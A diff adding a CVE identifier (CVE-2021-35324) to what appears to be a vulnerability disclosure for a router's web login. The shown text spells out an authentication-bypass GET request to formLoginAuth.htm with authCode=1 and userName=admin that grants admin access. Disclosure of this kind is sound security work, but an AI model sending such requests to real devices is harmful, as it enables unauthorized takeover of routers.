@@ -27,3 +27,7 @@ We set `authCode=1` and `userName=admin` , then sending GET request such as:
 http://192.168.0.1/formLoginAuth.htm?authCode=1&userName=admin&goURL=home.html&action=login
 
 Finally, we enter the admin page as an admin user.
+
+## CVE info
+
+CVE-2021-35324
